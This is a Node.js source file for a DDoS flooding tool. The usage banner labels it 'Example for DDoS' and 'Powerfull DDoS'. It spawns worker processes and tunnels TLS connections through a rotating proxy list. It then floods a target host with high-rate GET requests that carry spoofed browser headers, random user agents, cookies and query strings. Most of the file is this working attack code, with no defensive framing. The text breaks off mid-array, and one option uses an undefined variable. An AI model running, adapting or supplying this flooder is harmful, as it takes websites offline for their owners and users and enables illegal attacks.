require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs');
const randstr = require('randomstring')
const url = require('url');
var path = require("path");
const cluster = require('cluster');
const tls = require('tls');
const http = require('http');
const colors = require('colors');
const crypto = require('crypto');
const argv = require('minimist')(process.argv.slice(2));
const os = require('os');

function ra(length) {
    const rsdat = randstr.generate({
        "charset": "0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
        "length": length
    });
    return rsdat;
}

function generateCookie() {
    const rsdat = randstr.generate({
        "charset": "0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
        "length": 6
    });

    let cookie = `${rsdat}=${rsdat}; ${rsdat}=${rsdat};`;
    return cookie;
}

function randomElement(element) {
    return element[Math.floor(Math.random() * element.length)];
}

let cookies;

var file = path.basename(__filename);

function log(string) {
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
    console.log(`(${hours}:${minutes}:${seconds})`.white + ` - ${string}`);
}

if (process.argv.length == 2) {
    log(`(` + `
    â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–‘â–‘â–‘â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ•—
    â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ•‘
    â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘
    â–‘â•šâ•â•â•â–ˆâ–ˆâ•—â–‘â–‘â•šâ–ˆâ–ˆâ•”â•â–‘â–‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘
    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–‘â•šâ–ˆâ–ˆâ–ˆâ•‘
    â•šâ•â•â•â•â•â•â–‘â–‘â–‘â–‘â•šâ•â•â–‘â–‘â–‘â•šâ•â•â–‘â–‘â•šâ•â•â•šâ•â•â•â•â•â•â–‘â•šâ•â•â–‘â–‘â•šâ•â•â•
    [ HOST ] [ TIME ] [ THREAD ] [ RPS ] [ PROXY ] --debug=false --ua=all --querystring=true`.brightBlue + `)` + ` ` + `Example for DDoS`);
    process.exit(1);
}

if (process.argv.length < 6) {
    log(`(` + `
    â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–‘â–‘â–‘â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ•—
    â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ•‘
    â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘
    â–‘â•šâ•â•â•â–ˆâ–ˆâ•—â–‘â–‘â•šâ–ˆâ–ˆâ•”â•â–‘â–‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘
    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–‘â•šâ–ˆâ–ˆâ–ˆâ•‘
    â•šâ•â•â•â•â•â•â–‘â–‘â–‘â–‘â•šâ•â•â–‘â–‘â–‘â•šâ•â•â–‘â–‘â•šâ•â•â•šâ•â•â•â•â•â•â–‘â•šâ•â•â–‘â–‘â•šâ•â•â•
    [ HOST ] [ TIME ] [ THREAD ] [ RPS ] [ PROXY ] --debug=false --ua=all --querystring=true`.brightBlue + `)` + ` ` + `Example for DDoS`);
    process.exit(1);
}

const urlT = process.argv[2];
const timeT = process.argv[3];
const threadsT = process.argv[4];
const rateT = process.argv[5];
const proxyT = process.argv[6];
const debug = argv["debug"] || 'false';
const ua = argv["ua"] || 'all';
const cookiesT = argv["cookies"] || 'false';
const querystringT = argv["querystring"] || 'false';
const delay = argv["delay"] || 0;
const intervalAttack = argv["interval"] || 'true';

if (cluster.isMaster) {
    for (let i = 0; i < threadsT; i++) {
        cluster.fork();
    }

    console.clear()
    log(`(` + `
    â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–‘â–‘â–‘â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–ˆâ–ˆâ•—
    â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ•‘
    â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘
    â–‘â•šâ•â•â•â–ˆâ–ˆâ•—â–‘â–‘â•šâ–ˆâ–ˆâ•”â•â–‘â–‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘
    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–‘â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–‘â•šâ–ˆâ–ˆâ–ˆâ•‘
    â•šâ•â•â•â•â•â•â–‘â–‘â–‘â–‘â•šâ•â•â–‘â–‘â–‘â•šâ•â•â–‘â–‘â•šâ•â•â•šâ•â•â•â•â•â•â–‘â•šâ•â•â–‘â–‘â•šâ•â•â•
    ATTACK SENT`.brightBlue + `)` + ` ` + `Powerfull DDoS`);
    setTimeout(() => {
        log(`(` + `Livex Debug`.brightBlue + `)` + ` ` + `Attack is over.`);
        process.exit();
    }, timeT * 1000);
} else {
    setInterval(() => { startflood() }, delay)
}

var proxies = fs.readFileSync(proxyT, 'utf-8').toString().replace(/\r/g, '').split('\n');
const target = urlT.split('""')[0];

var parsed = url.parse(target);
process.setMaxListeners(0);

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
];
let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

function startflood() {
    var randomUA;
    let querystring = parsed.path.replace("%RAND%", ra(4));

    if (ua == 'linux') {
        randomUA = randomElement(linuxUA);
    }

    if (ua == 'windows') {
        randomUA = randomElement(windowsUA);
    }

    if (ua == 'macos') {
        randomUA = randomElement(macosUA);
    }

    if (ua == 'android') {
        randomUA = randomElement(androidUA);
    }

    if (ua == 'ios') {
        randomUA = randomElement(iosUA);
    }

    if (ua == 'all') {
        randomUA = randomElement(UAs);
    }


    if (cookiesT == 'true') {
        cookies = generateCookie();
    }


    if (querystringT == 'true') {
        querystring = parsed.path + "?" + ra(4) + "=" + crash;
    }

    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    proxy = proxy.split(':');

    if (debug == 'true') {
        log(`(` + `Flooder`.brightYellow + `)` + ` ` + `Attacking from ` + `${proxy[0]}:${proxy[1]}`.brightYellow + ` ` + `proxy.`);
    }

    const agent = new http.Agent({
        keepAlive: false,
        keepAliveMsecs: 50000,
        maxSockets: Infinity,
        maxTotalSockets: Infinity,
        maxSockets: Infinity
    });

    var req = http.request({
        host: proxy[0],
        port: proxy[1],
        method: 'CONNECT',
        agent: agent,
        globalAgent: agent,
        headers: {
            'Host': parsed.host,
            'Proxy-Connection': 'Keep-Alive',
            'Connection': 'Keep-Alive',
        },
        path: parsed.host + ":443"
    }, function () {
        req.setSocketKeepAlive(true);
    }).on('error', () => { });

    req.on('connect', function (res, socket, head) {
        const tlsConnection = tls.connect({
            host: parsed.host,
            ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
            secureProtocol: ['TLSv1_1_method', 'TLSv1_2_method', 'TLSv1_3_method'],
            servername: parsed.host,
            secure: true,
            rejectUnauthorized: false,
            honorCipherOrder: false,
            host: parsed.host,
            requestCert: true,
            clientCertEngine: "dynamic",
            socket: socket,
            secureOptions: secureOptions,
            secureContext: secureContext,
            secureProtocol: secureProtocol
        }, function () {
            tlsConnection.setKeepAlive(true, 60 * 10000);
            if (intervalAttack == 'true') {
                setInterval(() => {
                    for (let i = 0; i < rateT; i++) {
                        tlsConnection.write(
                            "GET " + querystring + " HTTP/1.1\r\n" +
                            "Host: " + parsed.host + "\r\n" +
                            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n" +
                            "User-Agent: " + randomElement(UAs) + "\r\n" +
                            "Upgrade-Insecure-Requests: 1\r\n" +
                            "X-Forwarded-For: " + proxy[0] + "\r\n" +
                            "Accept-Encoding: gzip, deflate, br\r\n" +
                            "Sec-Ch-Ua-Mobile: ?0\r\n" +
                            "Sec-Fetch-User: ?1\r\n" +
                            "Sec-Fetch-Mode: navigate\r\n" +
                            "Sec-Fetch-Site: same-origin\r\n" +
                            "Sec-Fetch-Dest: document\r\n" +
                            "Sec-Ch-Ua-Platform: \"Windows\"\r\n" +
                            "Sec-Ch-Ua-Platform-Version: \"10.0.0\"\r\n" + 
                            "Sec-Ch-Ua: \"Not;A Brand\";v=\"8\", \"Google Chrome\";v=\"11\", \"Chromium\";v=\"11\"\r\n" +
                            "Accept-Language: en-US,en;q=0.9,he-IL;q=0.8,he;q=0.7,br;q=0.6\r\n" +
                            "Dnt: 1\r\n" +
                            "Cache-Control: no-cache\r\n" +
                            "Connection: Keep-Alive\r\n" +
                            "X-Requested-With: XMLHttpRequest\r\n" +
                            "Pragma: no-cache\r\n" +
                            "\r\n"
                        );
                    }
                }, 1500)
            } else {
                for (let i = 0; i < rateT; i++) {
                    tlsConnection.write("GET" + ' ' + `${querystring} ` + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nReferer: ' + target + '\r\nOrigin: ' + target + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + randomUA + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\n' + 'Cookie:' + cookies + '\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive' + '\r\n\r\n');
                }
            }
        });

        tlsConnection.on('error', function (data) {
            tlsConnection.end();
            tlsConnection.destroy();
        });

        tlsConnection.on('data', function (data) { });
    });
    req.end();
}

const linuxUA = [
    'Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20130401 Firefox/70.6',
    'Mozilla/5.0 (Linux x86_64) Gecko/20100101 Firefox/72.5',
    'Mozilla/5.0 (Linux; U; Linux i580 x86_64; en-US) Gecko/20100101 Firefox/54.5',
    'Mozilla/5.0 (Linux; Linux i651 ; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/47.0.3278.219 Safari/537',
    'Mozilla/5.0 (Linux; U; Linux i673 ; en-US) AppleWebKit/537.28 (KHTML, like Gecko) Chrome/48.0.1914.238 Safari/602',
    'Mozilla/5.0 (Linux i686 ) AppleWebKit/602.28 (KHTML, like Gecko) Chrome/55.0.3439.272 Safari/600',
    'Mozilla/5.0 (Linux i663 ) AppleWebKit/536.36 (KHTML, like Gecko) Chrome/53.0.1513.397 Safari/533',
    'Mozilla/5.0 (Linux i543 ; en-US) AppleWebKit/600.22 (KHTML, like Gecko) Chrome/50.0.2507.222 Safari/603',
    'Mozilla/5.0 (U; Linux i543 x86_64) Gecko/20100101 Firefox/56.0',
    'Mozilla/5.0 (Linux x86_64; en-US) AppleWebKit/535.28 (KHTML, like Gecko) Chrome/54.0.1449.340 Safari/603',
]

const windowsUA = [
    'Mozilla/5.0 (Windows; Windows NT 10.3;; en-US) Gecko/20100101 Firefox/67.7',
    'Mozilla/5.0 (Windows; Windows NT 10.3; x64; en-US) Gecko/20100101 Firefox/47.6',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.3; x64; en-US Trident/5.0)',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; en-US Trident/6.0)',
    'Mozilla/5.0 (Windows NT 10.5; Win64; x64; en-US) AppleWebKit/603.14 (KHTML, like Gecko) Chrome/55.0.1223.119 Safari/535',
    'Mozilla/5.0 (Windows; Windows NT 10.4; x64; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/49.0.3941.120 Safari/533',
    'Mozilla/5.0 (Windows NT 10.5; WOW64) AppleWebKit/533.33 (KHTML, like Gecko) Chrome/48.0.1599.224 Safari/603',
    'Mozilla/5.0 (Windows; U; Windows NT 10.1; x64; en-US) Gecko/20100101 Firefox/46.6',
    'Mozilla/5.0 (Windows; Windows NT 10.5; Win64; x64; en-US) Gecko/20130401 Firefox/50.1',
    'Mozilla/5.0 (Windows; Windows NT 10.2; Win64; x64) Gecko/20130401 Firefox/46.2',
]

const macosUA = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 7_5_2; en-US) Gecko/20130401 Firefox/69.6',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 7_4_6) AppleWebKit/536.21 (KHTML, like Gecko) Chrome/52.0.3316.150 Safari/534',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 9_8_0; en-US) AppleWebKit/601.9 (KHTML, like Gecko) Chrome/50.0.1877.175 Safari/534',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 9_7_4; en-US) Gecko/20100101 Firefox/60.7',
    'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_3; en-US) AppleWebKit/603.8 (KHTML, like Gecko) Chrome/53.0.1164.191 Safari/601',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 7_4_6) Gecko/20100101 Firefox/71.2',
    'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_2_2) Gecko/20130401 Firefox/57.8',
    'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_0; en-US) Gecko/20100101 Firefox/66.2',
    'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_2_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/53.0.3573.223 Safari/537',
    'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_2_3; en-US) Gecko/20100101 Firefox/71.7',
]

const androidUA = [
    'Mozilla/5.0 (Linux; Android 5.0; HTC 80:number1-2e Build/JSS15J) AppleWebKit/602.26 (KHTML, like Gecko)  Chrome/50.0.3137.223 Mobile Safari/603.6',
    'Mozilla/5.0 (Android; Android 4.4.4; SAMSUNG GT-I9405I Build/KOT49H) AppleWebKit/537.27 (KHTML, like Gecko)  Chrome/48.0.2551.192 Mobile Safari/537.9',
    'Mozilla/5.0 (Linux; U; Android 4.4.1; Google Nexus 7 Build/KOT49H) AppleWebKit/600.25 (KHTML, like Gecko)  Chrome/50.0.3735.139 Mobile Safari/534.6',
    'Mozilla/5.0 (Linux; U; Android 5.0.1; Lenovo A7000-a Build/LRX21M;) AppleWebKit/603.50 (KHTML, like Gecko)  Chrome/49.0.1367.230 Mobile Safari/536.7',
    'Mozilla/5.0 (Android; Android 5.0; HTC Butterfly S 901s Build/LRX22G) AppleWebKit/534.26 (KHTML, like Gecko)  Chrome/53.0.3779.165 Mobile Safari/601.7',
    'Mozilla/5.0 (Linux; U; Android 7.1; Xperia V Build/NDE63X) AppleWebKit/602.47 (KHTML, like Gecko)  Chrome/50.0.3186.151 Mobile Safari/602.3',
    'Mozilla/5.0 (Linux; U; Android 4.4.4; LG-V400 Build/KOT49I) AppleWebKit/601.31 (KHTML, like Gecko)  Chrome/54.0.2031.281 Mobile Safari/536.5',
    'Mozilla/5.0 (Android; Android 5.0.2; SAMSUNG-SM-N915FY Build/LRX22C) AppleWebKit/533.11 (KHTML, like Gecko)  Chrome/48.0.3409.184 Mobile Safari/603.5',
    'Mozilla/5.0 (Linux; Android 6.0; SM-D920I Build/MDB08I) AppleWebKit/535.6 (KHTML, like Gecko)  Chrome/49.0.1780.124 Mobile Safari/535.4',
    'Mozilla/5.0 (Android; Android 5.1.1; SAMSUNG SM-G925L Build/LRX22G) AppleWebKit/537.9 (KHTML, like Gecko)  Chrome/50.0.2346.378 Mobile Safari/602.8',
]

const iosUA = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 7_6_7; like Mac OS X) AppleWebKit/600.2 (KHTML, like Gecko)  Chrome/49.0.2646.283 Mobile Safari/534.8',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_5_3; like Mac OS X) AppleWebKit/603.9 (KHTML, like Gecko)  Chrome/52.0.2675.243 Mobile Safari/537.4',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_0; like Mac OS X) AppleWebKit/533.21 (KHTML, like Gecko)  Chrome/49.0.2976.257 Mobile Safari/536.4',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_4; like Mac OS X) AppleWebKit/602.33 (KHTML, like Gecko)  Chrome/47.0.2123.227 Mobile Safari/601.9',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_6_2; like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/49.0.1127.362 Mobile Safari/535.4',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 7_7_3; like Mac OS X) AppleWebKit/603.24 (KHTML, like Gecko)  Chrome/53.0.2685.250 Mobile Safari/533.7',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 7_6_0; like Mac OS X) AppleWebKit/537.44 (KHTML, like Gecko)  Chrome/54.0.2644.162 Mobile Safari/600.4',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3_7; like Mac OS X) AppleWebKit/600.29 (KHTML, like Gecko)  Chrome/55.0.3151.292 Mobile Safari/603.9',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 9_7_5; like Mac OS X) AppleWebKit/602.13 (KHTML, like Gecko)  Chrome/48.0.1416.217 Mobile Safari/536.5',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_3_1; like Mac OS X) AppleWebKit/533.49 (KHTML, like Gecko)  Chrome/53.0.3153.354 Mobile Safari/602.0',
]

const UAs = [
    "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20130401 Firefox/70.6",
    "Mozilla/5.0 (Linux x86_64) Gecko/20100101 Firefox/72.5",
    "Mozilla/5.0 (Linux; U; Linux i580 x86_64; en-US) Gecko/20100101 Firefox/54.5",
    "Mozilla/5.0 (Linux; Linux i651 ; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/47.0.3278.219 Safari/537",
    "Mozilla/5.0 (Linux; U; Linux i673 ; en-US) AppleWebKit/537.28 (KHTML, like Gecko) Chrome/48.0.1914.238 Safari/602",
    "Mozilla/5.0 (Linux i686 ) AppleWebKit/602.28 (KHTML, like Gecko) Chrome/55.0.3439.272 Safari/600",
    "Mozilla/5.0 (Linux i663 ) AppleWebKit/536.36 (KHTML, like Gecko) Chrome/53.0.1513.397 Safari/533",
    "Mozilla/5.0 (Linux i543 ; en-US) AppleWebKit/600.22 (KHTML, like Gecko) Chrome/50.0.2507.222 Safari/603",
    "Mozilla/5.0 (U; Linux i543 x86_64) Gecko/20100101 Firefox/56.0",
    "Mozilla/5.0 (Linux x86_64; en-US) AppleWebKit/535.28 (KHTML, like Gecko) Chrome/54.0.1449.340 Safari/603",
    "Mozilla/5.0 (Windows; Windows NT 10.3;; en-US) Gecko/20100101 Firefox/67.7",
    "Mozilla/5.0 (Windows; Windows NT 10.3; x64; en-US) Gecko/20100101 Firefox/47.6",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.3; x64; en-US Trident/5.0)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; en-US Trident/6.0)",
    "Mozilla/5.0 (Windows NT 10.5; Win64; x64; en-US) AppleWebKit/603.14 (KHTML, like Gecko) Chrome/55.0.1223.119 Safari/535",
    "Mozilla/5.0 (Windows; Windows NT 10.4; x64; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/49.0.3941.120 Safari/533",
    "Mozilla/5.0 (Windows NT 10.5; WOW64) AppleWebKit/533.33 (KHTML, like Gecko) Chrome/48.0.1599.224 Safari/603",
    "Mozilla/5.0 (Windows; U; Windows NT 10.1; x64; en-US) Gecko/20100101 Firefox/46.6",
    "Mozilla/5.0 (Windows; Windows NT 10.5; Win64; x64; en-US) Gecko/20130401 Firefox/50.1",
    "Mozilla/5.0 (Windows; Windows NT 10.2; Win64; x64) Gecko/20130401 Firefox/46.2",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 7_5_2; en-US) Gecko/20130401 Firefox/69.6",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 7_4_6) AppleWebKit/536.21 (KHTML, like Gecko) Chrome/52.0.3316.150 Safari/534",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 9_8_0; en-US) AppleWebKit/601.9 (KHTML, like Gecko) Chrome/50.0.1877.175 Safari/534",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 9_7_4; en-US) Gecko/20100101 Firefox/60.7",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_3; en-US) AppleWebKit/603.8 (KHTML, like Gecko) Chrome/53.0.1164.191 Safari/601",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 7_4_6) Gecko/20100101 Firefox/71.2",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_2_2) Gecko/20130401 Firefox/57.8",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_0; en-US) Gecko/20100101 Firefox/66.2",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_2_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/53.0.3573.223 Safari/537",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_2_3; en-US) Gecko/20100101 Firefox/71.7",
    "Mozilla/5.0 (Linux; Android 5.0; HTC 80:number1-2e Build/JSS15J) AppleWebKit/602.26 (KHTML, like Gecko)  Chrome/50.0.3137.223 Mobile Safari/603.6",
    "Mozilla/5.0 (Android; Android 4.4.4; SAMSUNG GT-I9405I Build/KOT49H) AppleWebKit/537.27 (KHTML, like Gecko)  Chrome/48.0.2551.192 Mobile Safari/537.9",
    "Mozilla/5.0 (Linux; U; Android 4.4.1; Google Nexus 7 Build/KOT49H) AppleWebKit/600.25 (KHTML, like Gecko)  Chrome/50.0.3735.139 Mobile Safari/534.6",
    "Mozilla/5.0 (Linux; U; Android 5.0.1; Lenovo A7000-a Build/LRX21M;) AppleWebKit/603.50 (KHTML, like Gecko)  Chrome/49.0.1367.230 Mobile Safari/536.7",
    "Mozilla/5.0 (Android; Android 5.0; HTC Butterfly S 901s Build/LRX22G) AppleWebKit/534.26 (KHTML, like Gecko)  Chrome/53.0.3779.165 Mobile Safari/601.7",
    "Mozilla/5.0 (Linux; U; Android 7.1; Xperia V Build/NDE63X) AppleWebKit/602.47 (KHTML, like Gecko)  Chrome/50.0.3186.151 Mobile Safari/602.3",
    "Mozilla/5.0 (Linux; U; Android 4.4.4; LG-V400 Build/KOT49I) AppleWebKit/601.31 (KHTML, like Gecko)  Chrome/54.0.2031.281 Mobile Safari/536.5",
    "Mozilla/5.0 (Android; Android 5.0.2; SAMSUNG-SM-N915FY Build/LRX22C) AppleWebKit/533.11 (KHTML, like Gecko)  Chrome/48.0.3409.184 Mobile Safari/603.5",
    "Mozilla/5.0 (Linux; Android 6.0; SM-D920I Build/MDB08I) AppleWebKit/535.6 (KHTML, like Gecko)  Chrome/49.0.1780.124 Mobile Safari/535.4",
    "Mozilla/5.0 (Android; Android 5.1.1; SAMSUNG SM-G925L Build/LRX22G) AppleWebKit/537.9 (KHTML, like Gecko)  Chrome/50.0.2346.378 Mobile Safari/602.8",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 7_6_7; like Mac OS X) AppleWebKit/600.2 (KHTML, like Gecko)  Chrome/49.0.2646.283 Mobile Safari/534.8",
